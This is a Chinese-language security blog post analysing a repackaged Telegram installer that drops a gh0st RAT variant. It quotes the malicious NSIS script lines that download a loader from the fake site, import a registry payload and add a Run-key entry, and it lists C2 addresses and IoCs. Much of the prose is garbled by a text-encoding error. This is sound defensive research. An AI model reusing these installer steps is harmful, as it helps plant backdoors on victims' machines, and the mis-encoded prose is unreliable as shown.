---
title: åˆ†æä¸€å€‹åŠ æ–™çš„ Telegram for Windows ä¸­æ–‡ç‰ˆå®‰è£ç¨‹å¼
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2020-10-25 17:01:39
categories:
    - Research
thumbnailImage: thumb-min.jpg
coverImage: cover-min.jpg
keywords:
    - Telegram
    - Trojan
    - gh0st RAT
    - Malware
tags:
    - Telegram
    - Trojan
    - gh0st RAT
    - Malware
---
ç´€éŒ„ä¸€ä¸‹åˆ†æä¸€å€‹è¢«é‡æ–°æ‰“åŒ…åŠ æ–™éçš„ä¸­æ–‡ç‰ˆ Telegram å®‰è£ç¨‹å¼çš„éç¨‹å’Œç™¼ç¾çš„æ±è¥¿ã€‚
<!-- more -->

<!-- toc -->

---

æœ€åˆçš„æ¨£æœ¬ä¾†è‡ª `http://telegram-vip[.]com`ï¼Œä¸€å€‹ä¸­æ–‡ç‰ˆ Telegram çš„ä»‹ç´¹å’Œä¸‹è¼‰ç¶²ç«™ã€‚
{% image fancybox center p1.png "Figure 1. å‡çš„ä¸­æ–‡ç‰ˆ Telegram ç¶²ç«™" %}

ç¶²ç«™é¦–é å°±æœ‰å„ç‰ˆæœ¬çš„ä¸‹è¼‰é€£çµï¼Œä½†å…¶ä¸­é¦–é ä¸‹è¼‰ `Telegram for Mac` å’Œ `Telegram for windows` çš„é€£çµéƒ½æœƒæ˜¯ä¸‹è¼‰è¢«åŠ æ–™éçš„ Windows å®‰è£ç¨‹å¼ï¼ˆå¯«é€™ç¯‡æ–‡ç« çš„æ™‚å€™ä¸‹è¼‰çš„æª”æ¡ˆæ˜¯ `tsetup.2.1.10.exe`ï¼‰ã€‚é»é¸ Android æˆ– iPhone çš„ç‰ˆæœ¬æœƒåˆ°å¦ä¸€å€‹ä¸‹è¼‰çš„é é¢ï¼š
{% image fancybox center p2.png "Figure 2. ä¸‹è¼‰é é¢" %}
é€™é‚Šå°±æœ‰äº›ä¸åŒäº†ï¼š
- iPhone ä¸‹è¼‰çš„é€£çµæœƒé€£å›åˆ°æ­£å¸¸çš„ Apple App Store `https://apps.apple.com/app/telegram-messenger/id686449807`
- Android ç‰ˆæœ¬æœƒåˆ°å¦ä¸€å€‹é€£çµä¸‹è¼‰æª”æ¡ˆ `https://telegrcn.org/download/telegramCN_631.apk`
- Mac ç‰ˆæœ¬æœƒåˆ°å¦ä¸€å€‹é€£çµä¸‹è¼‰æª”æ¡ˆ `https://telegrcn.org/download/tsetup.2.1.10.dmg`
- Windows ç‰ˆæœ¬è·Ÿé¦–é ä¸‹è¼‰çš„æª”æ¡ˆä¸€æ¨£

æ¥ä¸‹ä¾†é€™ç¯‡æ–‡ç« æœƒåªé‡å° Windows çš„ç‰ˆæœ¬æ•˜è¿°ï¼Œé€™å€‹å‡çš„ç¶²ç«™åœ¨ä»Šå¹´ 9 æœˆæ™‚å°±å·²ç¶“åœ¨ Twitter ä¸Šæœ‰ç›¸é—œçš„è¨è«–ï¼ŒAndroid ç‰ˆæœ¬çš„ APK ä¹Ÿå·²çŸ¥æ˜¯å‡çš„ APPï¼Œæˆ‘åœ¨å¿«åˆ†æå®Œäº†æ‰æŸ¥åˆ°é€™å€‹è³‡æ–™ ğŸ˜¢ï¼Œå†æ¬¡å­¸åˆ°æ•™è¨“æŠŠé ­åŸ‹é€²é€†å‘ä¹‹å‰é‚„æ˜¯è¦å¥½å¥½çš„æŠŠè¨Šæ¯è’é›†è·Ÿèª¿æŸ¥åšå¥½ã€‚
{% raw %}
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Interesting, signed, low detected &quot;telegram_setup.2.1.6.exe&quot;: 8c957cfced1bcf7803f810d6ae5a6d13cce005637be3ed40a311793419cd92c1<br>From: http://telegram-vip[.]com/telegram_setup.2.1.6.exe<br>Seems some Chinese speaker made malware, targeting Chinese people.<br>ğŸ¤”<br>cc <a href="https://twitter.com/JAMESWT_MHT?ref_src=twsrc%5Etfw">@JAMESWT_MHT</a> <a href="https://twitter.com/cyb3rops?ref_src=twsrc%5Etfw">@cyb3rops</a> <a href="https://t.co/5jAtnQCkjx">pic.twitter.com/5jAtnQCkjx</a></p>&mdash; MalwareHunterTeam (@malwrhunterteam) <a href="https://twitter.com/malwrhunterteam/status/1310508328041283584?ref_src=twsrc%5Etfw">September 28, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
{% endraw %}

ä¸éé›–ç„¶å·²ç¶“æœ‰è¨è«–ä¸²å‡ºç¾ï¼Œä½†ç¾åœ¨çœ‹åˆ°çš„ç‰ˆæœ¬å·²ç¶“ä¾†åˆ°äº† `2.1.10`ï¼Œé€™è®“æˆ‘å¥½å¥‡æƒ³è¦ä¾†æ¯”è¼ƒä¸€ä¸‹è·Ÿä¹æœˆæ™‚çš„ `2.1.6` ç‰ˆæœ¬æœ‰äº†ä»€éº¼è®ŠåŒ–ã€‚æ¥ä¸‹ä¾†æœƒç”¨æˆ‘æ‰‹ä¸Šæœ‰çš„ `telegram_setup.2.1.10.exe` è·Ÿæˆ‘åœ¨ ANY.RUN é€™å€‹[åˆ†æ](https://app.any.run/tasks/aeb405ec-3fea-475f-9050-5ad0a5cf1c61/)æ‰¾åˆ°çš„ `telegram_setup.2.1.6.exe` ç›¸é—œæª”æ¡ˆä¾†åšæ¯”è¼ƒã€‚

## é‡æ–°æ‰“åŒ…åŠ æ–™éçš„å®‰è£ç¨‹å¼
|Filename|SHA256|
|-|-|
|telegram_setup.2.1.6.exe|1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8|
|telegram_setup.2.1.10.exe|35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba|

é€™å…©å€‹å®‰è£ç¨‹å¼éƒ½æ˜¯ç”¨ NSIS ([nullsoft scriptable install system](https://nsis.sourceforge.io/Main_Page)) æ‰“åŒ…çš„ï¼Œå¯ä»¥åˆ©ç”¨ 7-zip ç›´æ¥è§£å£“ç¸®å°±èƒ½å¾—åˆ°é‚„åŸçš„å®‰è£è…³æœ¬ `[NSIS].nsi`ã€‚7-zip åœ¨ `9.33` çš„ç‰ˆæœ¬åŠ å…¥äº†è‡ªå‹•åç·¨è­¯ NSIS è…³æœ¬çš„åŠŸèƒ½ï¼Œä½†åˆåœ¨ `15.06` æŠŠé€™å€‹åŠŸèƒ½æ‹¿æ‰äº†ï¼Œæ‰€ä»¥è¦æ³¨æ„ 7-zip ç‰ˆæœ¬å¿…é ˆä»‹æ–¼é€™å…©è€…ä¹‹é–“ã€‚

è§£é–‹ä»¥å¾Œå…©å€‹ç‰ˆæœ¬çš„ç›®éŒ„çµæ§‹å¦‚ä¸‹ï¼š
```
2.1.6/
â”œâ”€â”€ $PLUGINSDIR                        // NSIS ç›¸é—œçš„æª”æ¡ˆ
â”‚Â Â  â”œâ”€â”€ InstallOptions.dll
â”‚Â Â  â”œâ”€â”€ ioSpecial.ini
â”‚Â Â  â”œâ”€â”€ LangDLL.dll
â”‚Â Â  â”œâ”€â”€ modern-wizard.bmp
â”‚Â Â  â””â”€â”€ TextReplace.dll
â”œâ”€â”€ C                                  // å®‰è£éç¨‹ä¸­æœƒç›´æ¥è¤‡è£½åˆ°å°æ‡‰çš„ä½ç½®çš„æª”æ¡ˆ
â”‚Â Â  â””â”€â”€ PerfLog
â”‚Â Â      â”œâ”€â”€ AddInProcess.exe           // Backdoor (Loader)
â”‚Â Â      â””â”€â”€ AddInProcess.exe.config
â”œâ”€â”€ [NSIS].nsi                         // 7-zip è§£å‡ºä¾†çš„ NSIS è…³æœ¬
â”œâ”€â”€ ns.reg                             // Payload Registry File
â”œâ”€â”€ Telegram.exe                       // Telegram Desktop 2.1.6.0
â”œâ”€â”€ uninst.exe.nsis
â””â”€â”€ Updater.exe
```
```
2.1.10/
â”œâ”€â”€ $PLUGINSDIR                        // NSIS ç›¸é—œçš„æª”æ¡ˆ
â”‚Â Â  â”œâ”€â”€ InetLoad.dll
â”‚Â Â  â”œâ”€â”€ InstallOptions.dll
â”‚Â Â  â”œâ”€â”€ ioSpecial.ini
â”‚Â Â  â”œâ”€â”€ LangDLL.dll
â”‚Â Â  â”œâ”€â”€ modern-wizard.bmp
â”‚Â Â  â”œâ”€â”€ System.dll
â”‚Â Â  â””â”€â”€ TextReplace.dll
â”œâ”€â”€ [NSIS].nsi                         // 7-zip è§£å‡ºä¾†çš„ NSIS è…³æœ¬
â”œâ”€â”€ Telegram.exe                       // Telegram Desktop 2.1.6.0
â”œâ”€â”€ uninst.exe.nsis
â””â”€â”€ Updater.exe
```

å°æ¯”å…©å€‹ç‰ˆæœ¬å¯ä»¥å¾ˆæ˜é¡¯çš„æ³¨æ„åˆ° `2.1.10` å°‘äº† `C:\PerfLog` è·Ÿ `ns.reg` é—œéµçš„å¾Œé–€æª”æ¡ˆï¼Œ`2.1.6` å¾ˆç›´æ¥çš„å°±æŠŠé€™äº›æª”æ¡ˆä¸€èµ·æ‰“åŒ…ï¼Œ`2.1.10` æ”¹è®Šæ–¹å¼ï¼Œåˆ©ç”¨ NSIS è…³æœ¬åœ¨å®‰è£éç¨‹ä¸­æ‰å°‡é€™å…©å€‹æª”æ¡ˆä¸‹è¼‰ä¸‹ä¾†ï¼Œé€™å¯ä»¥åœ¨ `[NSIS].nis` è…³æœ¬ä¸­çœ‹åˆ°ï¼Œä¸‹é¢æ˜¯å¾ `2.1.10` çš„ `[NSIS].nsi` è…³æœ¬ä¸­ç¯€éŒ„éƒ¨ä»½ç›¸é—œçš„æŒ‡ä»¤ï¼š
```sh
# Download loader and registry file
InetLoad::load /BANNER "" "Cameron Diaz download in progress, please wait ;)" http://www.telegram-vip.com/index2.php cnPath.exe
InetLoad::load /BANNER "" "Cameron Diaz download in progress, please wait ;)" http://www.telegram-vip.com/index3.php ns.reg
```
```sh
# Replace 123456 to <ComputerName> from ns.reg then use regedit.exe to import
ReadRegStr $R1 HKLM SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName ComputerName
TextReplace::_FindInFile /NOUNLOAD $INSTDIR\ns.reg 123456 /S=1
TextReplace::_ReplaceInFile /NOUNLOAD $INSTDIR\ns.reg $INSTDIR\ns.reg 123456 $R1 "/S=1 /C=1 /AO=1"
Exec "regedit.exe /s $\"$INSTDIR\ns.reg$\""
```
```sh
# Move $INSTDIR\cnPath.exe to C:\PerfLog\AddInProcess.exe
StrCpy $R0 $INSTDIR\cnPath.exe
StrCpy $R1 C:\PerfLog\AddInProcess.exe
System::Call "Kernel32::MoveFileA(t R0,t R1)"
```
```sh
# Setup service registry and run
WriteRegStr HKCU Software\Microsoft\Windows\CurrentVersion\Run telegramCnService C:\PerfLog\AddInProcess.exe
ExecShell "" C:\PerfLog\AddInProcess.exe
```
åŸºæœ¬ä¸Šçœ‹å®Œ NSIS è…³æœ¬å°±èƒ½äº†è§£å®ƒçš„æ„ŸæŸ“æ‰‹æ®µè·ŸæŒä¹…åŒ–çš„æ–¹å¼ã€‚

## è¼‰å…¥å™¨ AddInProcess.exe
çŸ¥é“å®‰è£éç¨‹å‹•çš„æ‰‹è…³ä»¥å¾Œï¼Œç›®æ¨™å°±å¾ˆæ˜ç¢ºäº†ï¼Œ`AddInProcess.exe` è·Ÿå¯«å…¥çš„ Registry è³‡æ–™ã€‚

|Filename|SHA256|
|-|-|
|AddInProcess.exe (2.1.6)|f853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063|
|AddInProcess.exe (2.1.10)|379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811|

åŸºæœ¬ä¸Šå…©å€‹çš„å‡½å¼å…§å®¹ä¸¦æ²’æœ‰ä¸åŒï¼Œåƒ…æœ‰ metadata æ”¹è®Šè€Œå·²ï¼ŒFile Version å¾ `1.0.0.0` è®Šæˆ `1.3.0.0`ã€‚
{% image fancybox center p3.png "Figure 3. å…©è€…çš„æª”æ¡ˆåŸºæœ¬è¨Šæ¯" %}
{% image fancybox center p4.png "Figure 4. ç›¸åŒçš„ .NET å‡½å¼çµæ§‹" %}
{% image fancybox center p5.png "Figure 5. ç›¸åŒçš„ Main å‡½å¼" %}

å¾ Figure 5. çš„ Main å‡½å¼å°±å¯ä»¥çŸ¥é“ï¼Œ`AddInProcess.exe` åªæ˜¯å€‹è¼‰å…¥å™¨ï¼ŒçœŸæ­£çš„å…§å®¹åœ¨å®‰è£æ™‚åŒ¯å…¥çš„ registry è³‡æ–™è£¡ï¼Œä½åœ¨ `HKEY_CURRENT_USER\Software\<COMPUTERNAME>`è£¡é¢æ˜¯ base64 ç·¨ç¢¼éçš„ DLL å’Œä¸€å€‹ ip ä½å€ã€‚

{% image fancybox center p6.png "Figure 6. Registry çš„å…§å®¹" %}

## Assembly.Load(Malware.dll)
è—‰åŠ© .NET çš„ `Assembly.Load` å‡½å¼å¯ä»¥å‹•æ…‹è¼‰å…¥å¦ä¸€å€‹ .NET çš„ DLLï¼Œä¹Ÿå°±æ˜¯ registry çš„å…§å®¹ï¼Œæˆ‘å€‘å¯ä»¥æå–å‡ºä¾†é€²ä¸€æ­¥åˆ†æã€‚

|Filename|Compile Time|SHA256|
|-|-|-|
|ns.reg (2.1.6)|N/A|96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22|
|registry.bin (2.1.6)|2020-09-23T09:43:39|7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a|
|ns.reg (2.1.10)|N/A|d620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a|
|registry.bin (2.1.10)|2020-09-28T18:16:01|e60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef|

|PDB Path|
|-|
|D:\source\MyJob\åå°„dll\ConsoleApplication2\obj\Release\åå°„.pdb|

> é€™å…©å€‹ ns.reg éƒ½ç¶­æŒ "123456" ä¸¦æœªè¢«ä¿®æ”¹æˆ computer name å‰çš„ç‹€æ…‹ã€‚

æå–å‡ºä¾†çš„ .NET DLL æ“æœ‰ç›¸åŒçš„å‡½å¼ã€‚

{% image fancybox center p7.png "Figure 7. registry.bin çš„å‡½å¼" %}

å…¶ä¸­åƒ…æœ‰ Main å‡½å¼ï¼Œå’Œå¯«æ­»åœ¨ `ClassBuff` å…¶ä¸­çš„ `dlldata` æœ‰å·®ç•°ã€‚

{% image fancybox center p8.png "Figure 8. registry.bin (2.1.6) çš„ Main å‡½å¼" %}
{% image fancybox center p9.png "Figure 9. registry.bin (2.1.10) çš„ Main å‡½å¼" %}

åœ¨ `2.1.6` çš„ç‰ˆæœ¬ä¸­ï¼ŒC2 çš„ ip ä½å€æ˜¯ç”¨ `Program.GetRegedit()` å¾ registry è£¡é¢è®€å‡ºä¾†çš„ï¼Œä¸çŸ¥é“ç‚ºä»€éº¼åœ¨ `2.1.10` çš„ç‰ˆæœ¬ä¸­è®Šæˆå¸¶å…¥å¯«æ­»çš„ base64 å­—ä¸² `MTU0LjIyMi4xMDMuNTg6Nzg3OA==` åˆ° `Program.StartWorkThread()`ã€‚

{% image fancybox center p10.png "Figure 10. registry.bin çš„ StartWorkThread å‡½å¼" %}

`Program.StartWorkThread()` è² è²¬å°‡ C2 çš„ ip ä½å€å’Œ port æº–å‚™å¥½ä¾†æ¥è‘—å•Ÿå‹• `Program.MainThread()`ã€‚é€™è£¡æ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯é€™å€‹å‡½å¼æœ‰å¦ä¸€å€‹é è¨­çš„ C2 ip ä½å€ï¼Œç•¶å‡½æ•¸è¢«å‘¼å«ä»£å…¥ç©ºå­—ä¸²æ™‚ï¼Œä¾¿æœƒä½¿ç”¨é€™å€‹ ipã€‚ç¶œåˆå‰é¢çœ‹åˆ° `Main()` å‡½å¼è£¡æœ‰å€‹è¿´åœˆï¼Œåœ¨ç­‰å¾… 300 ç§’å¾Œä¾¿æœƒå‘¼å« `Program.StartWorkThread("")`ï¼Œé€™æ™‚ä¾¿æœƒä½¿ç”¨é€™å€‹ ip ä½å€ã€‚

{% image fancybox center p11.png "Figure 11. registry.bin çš„ MainThread å‡½å¼" %}

`Program.MainThread()` æ¥è‘—å°‡åŒ…å« ip ä½å€çš„ç‰©ä»¶è½‰ç‚º bytes å¾Œï¼Œå°‹æ‰¾ `ClassBuff().dlldata` è£¡é è¨­çš„ `255.255.255.255` ä¾†è¦†è“‹æ‰ã€‚æœ€å¾Œä½¿ç”¨ `DLLFromMemory` é€™å€‹ class åœ¨è¨˜æ†¶é«”ä¸­ç›´æ¥åŸ·è¡Œæœ€çµ‚çš„ DLLï¼Œexport function `Launch`ã€‚

## Hello gh0st RAT DLL

|Filename|Compile Time|SHA256|
|-|-|-|
|dlldata_2.1.6.bin|2020-09-23T06:17:16|e0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0|
|dlldata_2.1.10.bin|2020-09-28T18:15:16|9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db|

|PDB Path|
|-|
|D:\source\MyJob\ä¼ä¸šè¿œç¨‹æ§åˆ¶\Release\ServerDll.pdb|

> é€™å…©å€‹ DLL éƒ½ç¶­æŒ C2 ip æ˜¯ 255.255.255.255ï¼Œé‚„æ²’è¢«ä¿®æ”¹å‰å¯«æ­»åœ¨ registry.bin çš„åŸæ¨£ã€‚

æœ€å¾Œåœ¨è¨˜æ†¶é«”ä¸­å‹•æ…‹è¼‰å…¥çš„ DLL æ˜¯ gh0st RAT çš„è®Šç¨®ï¼Œæ–°èˆŠç‰ˆæœ¬å…©è€…çš„ç›¸ä¼¼åº¦æ¥µé«˜ï¼ŒåŠŸèƒ½ä¸Šå¤§è‡´æ²’æœ‰å·®ç•°ã€‚

{% image fancybox center p12.png "Figure 12. dlldata_2.1.6.bin å’Œ dlldata_2.1.10.bin BinDiff çš„æ¯”è¼ƒçµæœ" %}

é—œæ–¼ gh0st RAT çš„å·²ç¶“æœ‰å¾ˆå¤šå¾ˆè©³ç´°çš„å ±å‘Šè·ŸåŸå§‹ç¢¼å¯ä»¥é–±è®€ï¼Œé€™é‚Šå°±ä¸ç´°è¬›æœ€å¾Œçš„é€™å€‹ DLLã€‚æ¯”è¼ƒå€¼å¾—æçš„æ˜¯é€™å€‹æ¨£æœ¬å‚³é€å’Œæ¥æ”¶ TCP å°åŒ…éƒ½æœ‰é€²è¡Œç°¡å–®çš„ä½å…ƒé‹ç®—ã€‚

{% image fancybox center p13.png "Figure 13. æ”¶åˆ°å°åŒ…å¾Œçš„ç·¨ç¢¼å‹•ä½œ" %}
{% image fancybox center p14.png "Figure 14. é€å‡ºå°åŒ…å‰çš„ç·¨ç¢¼å‹•ä½œ" %}

å¦å¤–é€™å€‹ gh0st RAT è®Šç¨®çš„ magic header åƒ…æœ‰ä¸‰å€‹å­—ï¼š `203` (`\x32\x30\x33`)ï¼Œç·¨ç¢¼å¾Œæ˜¯ `\xCD\xCF\xCE`ï¼Œå¾Œé¢ 4 å€‹ bytes ä¸€æ¨£æ˜¯å°åŒ…çš„å¤§å°ï¼ˆFigure 15. çš„æ©˜è‰²æ¡† `\x0F\x03\x00\x00`ï¼‰ï¼Œå‰©é¤˜è³‡æ–™ä¸¦æœªå£“ç¸®ã€‚

{% image fancybox center p15.png "Figure 15. åŸå§‹çš„å°åŒ…ç‰¹å¾µ" %}

## å»¶ä¼¸èª¿æŸ¥
ä»¥ä¸Šï¼Œé—œæ–¼æƒ¡æ„ç¨‹å¼çš„éƒ¨ä»½å·²ç¶“ç­è§£çš„å·®ä¸å¤šäº†ï¼Œæ¥ä¸‹ä¾†æŠŠç›®å…‰æ”¾å›åˆ° C2 ä¸Šé¢ã€‚

å‰é¢åˆ†æçš„éç¨‹ä¸­å¾—åˆ°äº†é€™å…©å€‹ C2 ä½å€ï¼š
- `154.222.103.58:7878`
  - ç¬¬ä¸€å€‹ C2 ipï¼Œ`2.1.6` ç‰ˆæœ¬æ˜¯å¾ registry è®€å‡ºä¾†ï¼Œåˆ°äº† `2.1.10` é›–ç„¶ registry è£¡ä»ç„¶æœ‰ä¸€æ¨£çš„ ipï¼Œä½†æ¨£æœ¬å…§ä¹ŸåŒæ™‚å¯«æ­»äº†ä¸€æ¨£çš„ ipï¼ˆåƒè€ƒ Figure 9.ï¼‰
- `185.224.168.130:3563`
  - ç¬¬äºŒå€‹ C2 ipï¼Œç­‰å¾…äº”åˆ†é˜å¾Œæ‰é€£ç·šç”¨çš„ï¼ˆåƒè€ƒ Figure 10.ï¼‰

é‚„æœ‰æœ€åˆçš„å‡ç¶²ç«™ `http://telegram-vip.com`ï¼Œ A record æ˜¯ `45.114.106.2`ã€‚é€šé favicon hash æˆ– HTML body hash å¯ä»¥æ‰¾åˆ°ç¸½å…±æœ‰äº”å€‹é—œè¯çš„ ip éƒ½éƒ¨å±¬è‘—ä¸€æ¨£çš„å‡ç¶²ç«™ï¼š
- `45.114.106.2`
- `45.114.106.3`
- `45.114.106.4`
- `45.114.106.5`
- `45.114.106.6`

ç›¸é—œçš„æœå°‹ç‰¹å¾µï¼š
https://www.shodan.io/search?query=http.favicon.hash%3A1246367191+country%3A%22CN%22
https://censys.io/ipv4?q=f66e0b7ec3a87e950ae989e1825174b43ccd4b56c32963e5c475bead44adf700

{% image fancybox center p16.png "Figure 16. Shodan é‡å° favicon hash çš„æœå°‹çµæœ" %}

{% image fancybox center p17.png "Figure 17. Censys é‡å° HTTP body hash çš„æœå°‹çµæœ" %}

å…¶ä¸­ `45.114.106.3` æœ‰ä¸€å€‹ Domain Name `telegramsvip.com`ï¼Œçœ‹äº†ä¸€ä¸‹ whois æ˜¯ 10/15 æ‰å»ºçš„
```
Domain Name: TELEGRAMSVIP.COM
Registry Domain ID: 2565966013_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.godaddy.com
Registrar URL: http://www.godaddy.com
Updated Date: 2020-10-15T08:01:06Z
Creation Date: 2020-10-15T08:01:05Z
Registry Expiry Date: 2021-10-15T08:01:05Z
Registrar: GoDaddy.com, LLC
Registrar IANA ID: 146
Registrar Abuse Contact Email: abuse(|]godaddy.com
Registrar Abuse Contact Phone: 480-624-2505
Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
Domain Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
Name Server: NS35.DOMAINCONTROL.COM
Name Server: NS36.DOMAINCONTROL.COM
DNSSEC: unsigned
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2020-10-25T15:39:21Z
```

ç”šè‡³é‚„æ‰“äº† Google å»£å‘Š XD
{% image fancybox center p18.jpg "Figure 18. Google æœå°‹å»£å‘Š" %}

ç›¸è¼ƒåŸå…ˆçš„ `telegram-vip.com` æ˜¯åœ¨ 09/21 å°±å»ºç«‹äº†ï¼Œå°±åœ¨ç·¨è­¯å¾Œé–€çš„å‰å…©å¤©ã€‚
```
Domain Name: TELEGRAM-VIP.COM
Registry Domain ID: 2561073458_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.godaddy.com
Registrar URL: http://www.godaddy.com
Updated Date: 2020-10-15T08:03:30Z
Creation Date: 2020-09-21T06:44:59Z
Registry Expiry Date: 2021-09-21T06:44:59Z
Registrar: GoDaddy.com, LLC
Registrar IANA ID: 146
Registrar Abuse Contact Email: abuse(aT}godaddy.com
Registrar Abuse Contact Phone: 480-624-2505
Domain Status: ok https://icann.org/epp#ok
Name Server: NS13.DOMAINCONTROL.COM
Name Server: NS14.DOMAINCONTROL.COM
DNSSEC: unsigned
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2020-10-25T15:40:38Z
```

## å°çµ
ä»¥ä¸Šä¾¿æ˜¯é‡å° Windows installer çš„éƒ¨ä»½åœ¨åˆ†æéç¨‹ä¸­ç™¼ç¾çš„ä¸€äº›æœ‰è¶£çš„å…§å®¹ï¼Œé€™å€‹è©é¨™ç¶²ç«™ç¾åœ¨é‚„åœ¨æŒçºŒé‹ä½œä¸­ï¼Œæˆ–è¨±æœªä¾†é‚„èƒ½çœ‹åˆ°æ”»æ“Šè€…å°æ¨£æœ¬æœ‰æ‰€æ›´æ–°ï¼Œå†è§€å¯Ÿçœ‹çœ‹ã€‚~~ï¼ˆæˆ–æ˜¯æœ‰ç©ºä¹Ÿä¾†åˆ†æä¸€ä¸‹é‚£å€‹å‡çš„ APKï¼‰~~

## IoCs
|IP|Description|
|-|-|
|45.114.106.2|Fake Site|
|45.114.106.3|Fake Site|
|45.114.106.4|Fake Site|
|45.114.106.5|Fake Site|
|45.114.106.6|Fake Site|
|154.222.103.58|gh0st RAT C2|
|185.224.168.130|gh0st RAT C2|

|Domain|Creation Date|
|-|-|
|telegram-vip.com|2020-09-21T06:44:59Z|
|telegramsvip.com|2020-10-15T08:01:05Z|
|telegrcn.org|2020-05-19T02:31:56Z|


|SHA256|Description|
|-|-|
|1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8|telegram_setup.2.1.6.exe|
|35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba|tsetup.2.1.10.exe|
|f853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063|AddInProcess.exe (telegram_setup.2.1.6.exe)|
|379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811|AddInProcess.exe (tsetup.2.1.10.exe)|
|96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22|ns.reg (2.1.6)|
|d620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a|ns.reg (2.1.10)|
|7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a|excracted DLL from ns.reg (2.1.6)|
|e60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef|extracted DLL from ns.reg (2.1.10)|
|e0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0|embedded gh0st RAT DLL (2.1.6)|
|9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db|embedded gh0st RAT DLL (2.1.10)|
|19d1ff6bb589fab200f3bced0f148bb5e20fe9b37bd03de9cd425116cc0dba17|telegramCN_631.apk|

|PDB Path|
|-|
|D:\source\MyJob\åå°„dll\ConsoleApplication2\obj\Release\åå°„.pdb|
|D:\source\MyJob\ä¼ä¸šè¿œç¨‹æ§åˆ¶\Release\ServerDll.pdb|